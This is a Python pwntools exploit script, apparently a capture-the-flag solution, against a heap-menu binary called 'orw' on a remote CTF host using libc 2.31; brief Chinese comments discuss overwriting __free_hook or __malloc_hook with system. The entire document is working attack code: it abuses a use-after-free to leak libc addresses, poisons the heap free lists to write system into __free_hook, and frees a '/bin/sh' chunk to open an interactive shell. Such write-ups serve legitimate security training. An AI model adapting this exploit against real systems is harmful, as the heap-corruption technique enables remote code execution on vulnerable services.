#为了稳定得到flag，可以将free_hook覆盖为system后free有str_bin_sh的位置（但我没找到freehook位置）
#也可以将malloc_hook覆盖为system后malloc有str_bin_sh的位置
from pwn import * 
from LibcSearcher import * 
# context.log_level = 'debug' 
# p=process('./orw')
p=remote('t.ctf.qwq.cc',50090)
elf=ELF('./orw')
libc=ELF('./libc-2.31.so')
def add(length,content):
    p.recvuntil(b'>> ')
    p.sendline(b'1')
    p.recvuntil(b'Length of game description:\n')
    p.sendline(str(length).encode())
    p.recvuntil(b'Game description:\n')
    p.sendline(content)
def free(index):
    p.recvuntil(b'>> ')
    p.sendline(b'2')
    p.recvuntil(b'game index: ')
    p.sendline(str(index).encode())
def edit(index,content):
    p.recvuntil(b'>> ')
    p.sendline(b'3')
    p.recvuntil(b'game index: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'Edit Game description:\n')
    p.sendline(content)
def show(index):
    p.recvuntil(b'>> ')
    p.sendline(b'4')
    p.recvuntil(b'game index: ')
    p.sendline(str(index).encode())
add(0x30,b'/bin/sh\x00')
for i in range(7):
    add(0x100,b'/bin/sh\x00')
for i in range(7):
    add(0x50,b'/bin/sh\x00')
add(0x100,b'/bin/sh\x00')#15
add(0x50,b'/bin/sh\x00')#16
add(0x50,b'/bin/sh\x00')#17
for i in range(14):
    free(i+1)

show(2)
get_addr=u64(p.recv(6).ljust(8,b'\x00'))
print(hex(get_addr))
free(15)
show(15)

main_arena_96=u64(p.recv(6).ljust(8,b'\x00'))
malloc_hook=main_arena_96-0x70
libcbase=malloc_hook-libc.symbols['__malloc_hook']
print('malloc_hook',hex(malloc_hook))
print('libcbase',hex(libcbase))
system_addr=libcbase+libc.symbols['system']
free_hook = libcbase+libc.sym["__free_hook"]
one_gadget=libcbase+0xe3b34
print('freehook',hex(free_hook))
print('system',hex(system_addr))
printf_addr=libcbase+libc.symbols['printf']
# 0xe3b2e
# 0xe3b31
# 0xe3b34
add(0x30,b'/bin/sh\x00')#18
free(16)
free(17)
hackloc=malloc_hook-0x38
print(hex(hackloc))
edit(17,p64(hackloc))

edit(14,p64(free_hook-0x20))
add(0x50,b'/bin/sh\x00')#19
add(0x50,b'/bin/sh\x00')#20
edit(20,b'\x00'*0x20+p64(system_addr)+p64(0))
pause()
free(18)
p.interactive()
